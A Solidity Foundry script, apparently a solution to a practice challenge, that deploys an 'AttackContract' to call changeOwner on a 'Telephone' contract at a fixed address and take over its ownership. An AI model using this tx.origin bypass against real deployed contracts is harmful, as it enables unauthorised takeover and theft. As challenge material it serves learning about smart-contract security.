// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    Telephone public telephone;
    AttackContract public attackContract;

    function run() external {
        telephone = Telephone(0x250a159c66ddbF23B1600351750Fa7C6f096AA3d);
        changeOwnerByCallingAttack();
    }

    function changeOwnerByCallingAttack() public {
        vm.startBroadcast();
        attackContract = new AttackContract();

        attackContract.attack();
        vm.stopBroadcast();
    }
}

contract AttackContract {
    function attack() public {
        Telephone telephone = Telephone(
            0x250a159c66ddbF23B1600351750Fa7C6f096AA3d
        );
        telephone.changeOwner(msg.sender);
    }
}
